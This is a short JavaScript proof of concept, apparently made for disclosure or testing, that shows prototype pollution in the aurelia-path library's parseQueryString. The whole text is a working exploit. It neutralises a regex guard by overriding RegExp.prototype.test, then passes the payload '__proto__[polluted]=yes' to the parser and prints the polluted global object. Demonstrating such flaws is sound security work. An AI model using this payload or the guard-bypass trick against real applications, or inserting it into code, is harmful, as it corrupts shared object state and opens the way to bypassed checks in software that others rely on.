RegExp.prototype.test = () => false;
const ap = require('aurelia-path');
console.log({}.polluted);
ap.parseQueryString('__proto__[polluted]=yes');
console.log({}.polluted);